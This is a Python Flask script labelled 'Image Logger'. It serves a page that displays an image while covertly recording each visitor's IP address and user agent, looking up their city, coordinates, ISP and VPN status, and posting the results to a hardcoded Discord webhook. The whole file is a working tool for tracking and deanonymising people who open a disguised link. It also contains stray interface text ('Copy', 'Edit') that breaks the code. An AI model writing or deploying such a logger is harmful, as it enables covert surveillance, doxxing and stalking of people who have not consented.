from flask import Flask, request, make_response
import requests
import base64
import httpagentparser

app = Flask(__name__)

WEBHOOK = "https://discord.com/api/webhooks/1392237664173821992/eALBCASflu7ORW3tTSGzsTlYt7eb_TFY-dTZE4ZAz6hohPkdMWNq2GZ4C2BiHUQnD0Bh"
IMAGE_URL = "https://photospace.life/TUHPWY"

def log(ip, user_agent):
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        os, browser = httpagentparser.simple_detect(user_agent)

        embed = {
            "username": "Image Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": 0x00FFFF,
                "description": f"""**A User Opened the Image!**

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat')}, {info.get('lon')}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile')}`
> **VPN:** `{info.get('proxy')}`
> **Bot:** `{info.get('hosting', False)}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
{user_agent}

""",
Copy
Edit
                "thumbnail": {"url": IMAGE_URL}
            }]
        }

        requests.post(WEBHOOK, json=embed)
    except Exception as e:
        requests.post(WEBHOOK, json={
            "username": "Image Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": 0x00FFFF,
                "description": f"Error while logging IP:\n```\n{str(e)}\n```"
            }]
        })

@app.route("/")
def main():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent')
    log(ip, ua)

    html = f"""
    <html>
    <head><meta charset="utf-8"><title>Loading...</title></head>
    <body style="margin:0;padding:0;background:#000;">
        <img src="{IMAGE_URL}" style="width:100vw;height:100vh;object-fit:contain;" />
    </body>
    </html>
    """
    return make_response(html, 200)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
